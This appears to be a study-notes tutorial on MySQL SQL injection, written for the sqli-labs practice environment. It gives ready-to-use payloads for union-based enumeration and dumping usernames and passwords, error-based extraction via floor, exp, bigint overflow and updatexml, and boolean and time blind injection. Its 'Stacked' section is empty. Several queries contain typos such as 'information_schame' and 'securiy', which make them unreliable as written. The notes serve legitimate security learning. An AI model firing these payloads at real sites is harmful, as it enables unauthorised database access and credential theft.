# SQL Injection

> Before wirting, I want to share a useful learning website about sqli. That [sqli-labs](https://www.cnblogs.com/zhengna/p/12617743.html)

And you are supposed to know the basic of sqli, such as some userful function like "user()","database()","group_concat()", and note that the use
of "#", "--+", etc.

Some useful url encode
1. %20: " "
2. %23: "#"
3. %3a: ":"
4. %7e: "~"
5. %27: "'"
...

# Content
- [1. Union-based](#1-Union-based-Injection)
- [2. Error-based](#2-Error-based-Injection)
- [3. Boolean Blind](#3-Boolean-Blind-Injection)
- [4. Time Blind](#4-Time-Blind-Injection)
- [5. Stacked](#5-Stacked-Injection)

## 1. Union-based Injection

Here are some basic steps of union injection.

### 1.1 Look for the type of closing symbol

See you need to upload the **$id**

You can put "/?id=" + followings:
1. 1 or 1=1--+
2. 1' or 1=1--+
3. 1" or 1=1--+
4. 1) or 1=1--+
5. 1') or 1=1--+
6. 1") or 1=1--+

You can find that the correct closing lead to a normal reflect instead of ERROR.

### 1.2 Ensure the column number

We assume that $id closed by single quote, then use **order** to find the columns.

Try 
```
?id=1' order by 1--+
```
and then 
```
?id=1' order by 2--+
```
until errors. That's the column number.

### 1.3 Check out the display data

Suppose that there is three columns in total.
```
?id=-1' union select 1,2,3 --+
```
If the output contains 2 and 3, we can set payload in position 2 and 3, where will show the data we want.

Note that there is always a **LIMIT 0,1** in the query. And you need to make the select of $id not work.

### 1.4 Blast databases

The current database you are using is **database()**
Use following to show it:
```
?id=-1' union select 1,database(),3 --+
```

If you want to show the all databases, try following:
```
?id=-1' union select 1,group_concat(schema_name),3 from information_schame.schemata --+
```

### 1.5 Blast tables

You always need to know the tables in your current database, blast tables like this:

```
?id=-1' union select 1,group_concat(table_name),3 from information_schame.tables where table_schema=database() --+
```

You can replace the database() with the database name you found in step 4.

### 1.6 Blast columns

Say you want to blast all columns of table "users" in current database. 

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```

### 1.7 Dump the data

Finally, you got the "id,username,password" columns in table users. 
```
?id=-1' union select 1,group_concat(username, 0x3a, password),3 from users --+
```

## 2. Error-based Injection

### 2.1 floor

```
?id=1' union select 1,count(*),concat(0x3a,(select user()),0x3a) a from information_schema.columns group by a--+
```
Replace the (select user()) to others to upload payload.

### 2.2 Double out of range
```
?id=1' union select (exp(~(select * from (select user())a))),2,3 --+
```
Same as floor, replace the (select user())

### 2.3 *Bigint overflow
```
?id=1' union select 1,(!(select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())a)-~0),3 --+
```
Here 'a' is alias.

### 2.4 *Xpath

There is function called *updatexml* used to update xml doc.
> Usage: updatexml(target_xml_doc, xml_path, content)

```
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e),1)--+
```
You can also use group_concat(table_name) without limit 0,1, but notice that updatexml error can only return 32 char once.

Use **substr** to show the full content in several times
```
?id=1' and updatexml(1,substr(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),30),1)--+
```

## 3. Boolean Blind Injection

### 3.1 string interception

#### 3.1.1 MID

> Usage: mid(column_name, start[, length])
> If don't have length argument, mid will return all content begin with start

Note that the start begin index with 1 while LIMIT begin with 0

```
?id=1' and mid((select tables from information_schema.tables where table_schema=database() LIMIT 0,1),1,1)>'a' --+
```

In some case you may need to use ascii value instead of 'a'.(such as the forbidden of single quote)

Use ord() or ascii() function to compare:

```
?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=101 --+
```

#### 3.1.2 Substr

The usage of substr is same as mid.

#### 3.1.3 left

Similar to mid.
> left(database(),1)>'s'

Use dictionary order to compare:
> left(database(),3)>'us'

### 3.2 regexp injection

Return 1 if match correctly, else 0.

regexp can always use with *if*
> if(expression, epx1, epx2)

if expression right return epx1, else epx2
```
select * from users where id = 1 and 1 = (user() regexp '^us');
select * from users where id = 1 and 1 = (if(user() regexp '^us'),1,0)
```

We match 'user' follow a certain order like this:
'^[a-z]' -> '^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' > '^user[a-z]' > FALSE
```
?id=1' and 1=(select 1 from information_schema.tables where table_schema='securiy' and table_name regexp '^u[a-z]' LIMIT 0,1) --+
```
Note that LIMIT 0,1 is necessary otherwise an (subquery returns more than 1 row) error will occur.

## 4. Time Blind Injection

### 4.1 sleep()

> sleep() function always use with if

```
?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+
```

method 2: use benchmark()

## 5. Stacked Injection







